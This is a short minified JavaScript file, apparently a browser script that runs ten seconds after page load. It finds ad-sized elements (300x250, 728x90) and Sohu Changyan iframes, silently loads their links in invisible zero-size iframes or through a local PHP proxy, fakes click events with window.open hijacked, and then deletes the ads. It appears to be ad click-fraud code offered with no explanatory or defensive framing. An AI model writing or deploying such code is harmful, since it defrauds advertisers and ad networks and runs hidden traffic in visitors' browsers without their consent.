!function(){window.$||(window.$=window.jQuery);var n=function(n,t){var e=document.createEvent("HTMLEvents");e.initEvent(t,!0,!0),n.dispatchEvent(e),$(n).trigger(t)},t=function(n){return!(!n||0!==n.indexOf("http"))},e={},i={},r=function(n,t,e){var i=$("html");return e&&(i=$(e).contents()),i.find("a#res0,img,iframe,embed,object").filter(function(e,i){var r=$(i);return r.width()==n&&r.height()==t})},o=function(n,t,e,i){var r=$("html");return i&&(r=$(i).contents()),r.find("iframe").filter(function(i,r){var o=$(r),a=$(r).attr("src");return!(!a||(a=a.replace(/^(http|https)\:\/\//gi,""),0!==a.indexOf(n)||o.width()!=t||o.height()!=e))})},a=function(n,t,r){void 0!=t&&void 0!=r||(t=i.width,r=i.height);var o=$("<iframe height=0 width=0 />");$("body").append(o),o.on("load",function(n){if($(this).remove(),$(".iframe-ads-"+t+"-"+r).remove(),e[t+"*"+r]){for(var i=e[t+"*"+r],o=0;o<i.length;o++)"BODY"===i[o].parent().tagName?i[o].remove():i[o].parent().remove();e[t+"*"+r]=[]}}),o.get(0).src=n},h=function(n,t,e){var i=$('<iframe class="iframe-ads-'+t+"-"+e+'" height=0 width=0 />');$("body").append(i),i.on("load",function(n){d(t,e,this)}),i.get(0).src="/PHPProxy/phpproxy.php?url="+encodeURIComponent(n)},c=function(r,o,c){var f=$(r);if("IFRAME"===f.get(0).tagName){var u=f.attr("src");u&&0===u.indexOf("http")?(h(u,o,c),e[o+"*"+c]?e[o+"*"+c].push(f):e[o+"*"+c]=[f]):d(o,c,f.get(0))}else{var p=null;if("A"===f.get(0).tagName&&(p=f),p||(p=f.siblings("a")),0===p.length&&(p=f.parents("a")),0===p.length&&(p=f.prev()),i={width:o,height:c},t(p.attr("href")))a(p.attr("href"),o,c);else{var v=window.open;window.open=a,n(p.get(0),"click"),window.open=v}e[o+"*"+c]?e[o+"*"+c].push(p):e[o+"*"+c]=[p]}},d=function(n,t,e){var i=null;e&&e.contentWindow&&(i=e.contentWindow.open,e.contentWindow.open=a);var o=r(n,t,e);return o.length<1?!1:(o.each(function(e,i){c(i,n,t)}),e&&e.contentWindow&&(e.contentWindow.open=i),!0)},f=function(n,t,e,i,r,a){var h=o(n,t,e,a);return h.length<1?!1:(h.each(function(n,t){c(t,i,r)}),!0)};setTimeout(function(){d(300,250),d(728,90),f("changyan.sohu.com",650,320,728,90)},1e4)}();